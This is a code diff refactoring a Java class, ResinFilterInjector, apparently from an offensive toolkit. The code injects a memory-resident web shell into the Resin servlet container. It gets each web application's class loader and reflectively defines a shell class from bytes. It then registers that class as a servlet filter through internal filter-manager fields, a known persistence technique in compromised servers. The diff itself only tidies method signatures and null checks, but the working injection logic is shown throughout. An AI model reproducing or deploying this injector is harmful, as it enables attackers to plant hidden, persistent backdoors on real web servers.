@@ -17,7 +17,7 @@ import java.util.zip.GZIPInputStream;
 public class ResinFilterInjector {
 
     
-    private static boolean ok = false;
+    private static boolean ok;
 
     private static String shellClassName;
     private static String shellClass;
@@ -33,14 +33,12 @@ public class ResinFilterInjector {
         } catch (Throwable throwable) {
             
         }
-        if (contexts == null || contexts.isEmpty()) {
-           
-        } else {
+        if (contexts != null) {
             for (Object context : contexts) {
                 try {
                     
-                    Object shell = getShell(context);
-                    inject(context, shell);
+                    loadShell(context);
+                    inject(context);
                    
                 } catch (Throwable e) {
                     
@@ -86,9 +84,9 @@ public class ResinFilterInjector {
     }
 
     
-    private Object getShell(Object context) throws Exception {
+    private void loadShell(Object context) throws Exception {
         ClassLoader classLoader = getWebAppClassLoader(context);
-        Class<?> clazz = null;
+        Class<?> clazz;
         try {
             clazz = classLoader.loadClass(shellClassName);
         } catch (Exception e) {
@@ -97,10 +95,10 @@ public class ResinFilterInjector {
             defineClass.setAccessible(true);
             clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
         }
-        return clazz.newInstance();
+        clazz.newInstance();
     }
 
-    private void inject(Object context, Object filter) throws Exception {
+    private void inject(Object context) throws Exception {
         Map<String, Object> filters = (Map) getFieldValue(getFieldValue(context, "_filterManager"), "_filters");
         for (String key : filters.keySet()) {
             if (key.contains(shellClassName)) {
